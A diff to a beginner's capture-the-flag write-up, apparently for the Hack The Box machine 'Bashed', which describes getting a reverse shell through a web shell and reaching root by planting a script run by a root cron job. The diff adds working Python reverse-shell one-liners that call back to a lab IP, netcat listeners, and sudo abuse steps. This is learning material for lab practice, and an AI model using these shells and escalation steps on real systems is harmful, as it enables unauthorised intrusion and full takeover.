@@ -12,7 +12,7 @@ categories:
 
 This was the first machine I've attempted to pop, the first real exercise in this field. Here I will describe the step I took to get both the `user` and `root` flags for this machine. Following my fumblings, I will detail how I should have proceeded to gain user and root access.
 
-##How I Did It
+## How I Did It
  
 ### User
 
@@ -175,7 +175,7 @@ First we need to create a netcat listener on our Kali machine.
 
 ```
 
-root@loki:~# nc -nlvp 1337
+root@Vindicare:~$ nc -nlvp 1337
 listening on [any] 1337 ...
 
 ```
@@ -184,7 +184,189 @@ Next we just use this handy python code on the web shell...
 
 ```
 
-www-data@bashed:/home/arrexel#  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.128",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+www-data@bashed:/home/arrexel#  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.19",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 ```
+
+Looking at the netcat listener....
+
+```
+sypher@Vindicare:~$ nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.15.19] from (UNKNOWN) [10.10.10.68] 40976
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+BAM! We have a shell.
+
+**7**. Now it's time to find a `privesc` path. First step is to find out which privilege commands our current user (`www-data`) can use.
+
+```
+
+$ sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+
+```
+
+It appears `www-data` can sudo as `scriptmanager` without a password. This looks like the right path to take for privilege escalation.
+
+**8**. Let's have a look at the home directory of `scriptmanager`
+
+```
+$ ls -al
+total 28
+drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4 17:08 .
+drwxr-xr-x 4 root          root          4096 Dec  4 13:53 ..
+-rw------- 1 scriptmanager scriptmanager    2 Dec  4 17:14 .bash_history
+-rw-r--r-- 1 scriptmanager scriptmanager  220 Dec  4 13:53 .bash_logout
+-rw-r--r-- 1 scriptmanager scriptmanager 3786 Dec  4 17:12 .bashrc
+drwxr-xr-x 2 scriptmanager scriptmanager 4096 Dec  4 16:49 .nano
+-rw-r--r-- 1 scriptmanager scriptmanager  655 Dec  4 13:53 .profile
+
+```
+
+Doesn't apear to be anything of interest in here.
+
+**9**. Let's now have a look for interesting directories from the root (`/`) directory.
+
+```
+$ ls -al
+total 88
+drwxr-xr-x  23 root          root           4096 Dec  4 13:02 .
+drwxr-xr-x  23 root          root           4096 Dec  4 13:02 ..
+drwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin
+drwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot
+drwxr-xr-x  19 root          root           4240 Mar  8 21:32 dev
+drwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc
+drwxr-xr-x   4 root          root           4096 Dec  4 13:53 home
+lrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib
+drwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64
+drwx------   2 root          root          16384 Dec  4 11:13 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4 11:13 media
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt
+dr-xr-xr-x 113 root          root              0 Mar  8 21:32 proc
+drwx------   3 root          root           4096 Dec  4 13:03 root
+drwxr-xr-x  18 root          root            500 Mar  8 21:32 run
+drwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Mar  8 21:32 sys
+drwxrwxrwt  10 root          root           4096 Mar  8 21:44 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
+drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
+lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
+
+```
+Looks like there's something of interest here. That `/scripts/` directory looks out of place.
+
+**10**. Let's take a closer look
+
+```
+$ cd /scripts
+/bin/sh: 6: cd: can't cd to /scripts
+
+
+```
+
+Looks like we don't have access to that directory. Luckily we can `sudo` as `scriptmanager` to have a peek inside.
+
+```
+
+$ sudo -u scriptmanager ls -al /scripts
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4 18:06 .
+drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py
+-rw-r--r--  1 root          root            12 Mar  8 22:12 test.txt
+$ 
+
+```
+Interesting that the `text.txt` file is owned by `root`. Let's take a look at that python script and the `text.txt` file.
+
+```
+$ sudo -u scriptmanager cat /scripts/test.py
+f = open("test.txt", "w")
+f.write("testing 123!")
+f.close
+
+$ sudo -u scriptmanager cat /scripts/test.txt
+testing 123!
+
+```
+
+Analyzing the code of the script it looks like it simply creates a  `text.txt` file and writes the string "testing 123!". But why is `text.txt` owned by root while `test.py` is owned by `scriptmanager`?
+
+One possible explanation is that there is a `cron job` with `root` privilege that executes `test.py`. If that theory is correct we can reverse shell with `root` privilige by placing a script in the `/scripts` directory. (Here I deviate from the Info Security Geek write up. They replace the original `test.py` script for the reverse shell, I want to write my own script)
+
+**11**. Ok let's put this theory to the test! Let's create a script using `scriptmanager`  and copy it to the script folder. First let's set up our `netcat` listener again. 
+
+```
+
+sypher@Vindicare:~$ nc -nlvp 31337
+listening on [any] 31337 ...
+
+```
+
+Now lets create the script in the `/tmp` folder and copy it over to the `/scripts` folder.
+
+```
+$ sudo -u scriptmanager echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.19\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > /tmp/exploit.py
+
+```
+
+Now lets copy the script to the `/scripts` directory.
+
+```
+
+sudo -u scriptmanager cp /tmp/exploit.py /scripts/exploit.py
+
+```
+And...
+
+```
+
+root@Vindicare:~$ nc -nlvp 31337
+listening on [any] 31337 ...
+connect to [10.10.15.19] from (UNKNOWN) [10.10.10.68] 42032
+/bin/sh: 0: can't access tty; job control turned off
+ # id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+```
+
+BAM! we have root....
+Let's not navigate to the root folder and take the flag
+
+```
+
+ # cd /root
+ # ls
+root.txt
+
+```
+
+Before we finish up let confirm that the `cron job` theory is correct.
+
+```
+
+ # crontab -l
+* * * * * cd /scripts; for f in *.py; do python "$f"; done
+
+```
+
+As you can see there is a `cron job` is owned by root and it runs a for loop which executes all files with .py extension under the `/scripts` directory.
+
+Before we go lets just clean up all the traces we've left on the machine.
+remove our mark in `/tmp` folder and in the `/scripts` folder.
+
+And that's it. Big thanks to the `Info Security Geek` for their write up, it helped me understand why my method worked and provided a beautiful example of `enumeration` and finding a `privesc` path.
 
